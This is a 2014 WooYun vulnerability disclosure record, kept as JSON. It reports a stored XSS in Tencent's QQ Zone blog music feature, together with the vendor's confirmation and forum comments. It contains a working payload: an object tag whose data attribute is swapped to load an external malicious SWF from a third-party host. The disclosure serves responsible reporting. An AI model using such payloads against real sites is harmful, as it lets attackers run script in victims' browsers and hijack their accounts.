{"id": 5548, "wybug_id": "wooyun-2014-049631", "wybug_title": "QQ空间某功能缺陷导致日志存储型XSS", "wybug_corp": "腾讯", "wybug_author": "kobin97", "wybug_date": "2014-01-23 13:06", "wybug_open_date": "2014-03-09 13:07", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向公众公开  简要描述： QQ空间某功能缺陷导致日志存储型XSS，没有二哥的精彩分析，也没有什么精彩的绕过技术，just a xss 详细说明：  新建一个日志，插入一首歌。歌曲所生成的flash是白名单。如：<object allowscriptaccess=\"always\" bgcolor=\"#ffffff\" class=\"blog_music\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0\" height=\"100\" id=\"musicFlash0\" menu=\"true\" name=\"musicFlash**\" ubb=\"729312|3|http://stream9.qqmusic.qq.com/12729312.wma|Postcard from Paris|6458|The Band Perry|0\" width=\"410\"><param name=\"movie\" value=\"http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\"/><param name=\"data\" value=\"http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\"/><param name=\"bgColor\" value=\"#ffffff\"/><param name=\"wmode\" value=\"transparent\"/><param name=\"menu\" value=\"true\"/><param name=\"allowScriptAccess\" value=\"always\"/></object>但flash地址由 object 中的 data 参数所左右。于时乎<object allowscriptaccess=\"always\" bgcolor=\"#ffffff\" class=\"blog_music\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0\" data=\"http://xsst.sinaapp.com/Xss.swf\" height=\"100\" id=\"musicFlash0\" menu=\"true\" name=\"musicFlash**\" ubb=\"729312|3|http://stream9.qqmusic.qq.com/12729312.wma|Postcard from Paris|6458|The Band Perry|0\" width=\"410\"><param name=\"movie\" value=\"http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\"/><param name=\"data\" value=\"http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\"/><param name=\"bgColor\" value=\"#ffffff\"/><param name=\"wmode\" value=\"transparent\"/><param name=\"menu\" value=\"true\"/><param name=\"allowScriptAccess\" value=\"always\"/></object>借用 二哥的 http://xsst.sinaapp.com/Xss.swf提交，即生效。（此xss只影响 IE 浏览器。）   漏洞证明：  \n\n   修复方案：  过滤吧。。   版权声明：转载请注明来源 kobin97@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-23 14:27 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-23 13:11 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  支持一哥    \n     2014-01-23 13:14 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  哦？    \n     2014-01-23 13:25 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  不科学啊，一哥也玩XSS    \n     2014-01-23 14:47 |    \t\t无面者 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | I'm a new man in security area.)\t\t \n  tx没有感谢么。。。    \n     2014-02-13 23:15 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @小胖子 现在的二哥和三哥都是原一哥？    \n     2014-02-13 23:54 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @px1624 嗯，我给你说过哒，一哥马甲rank都上千的。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}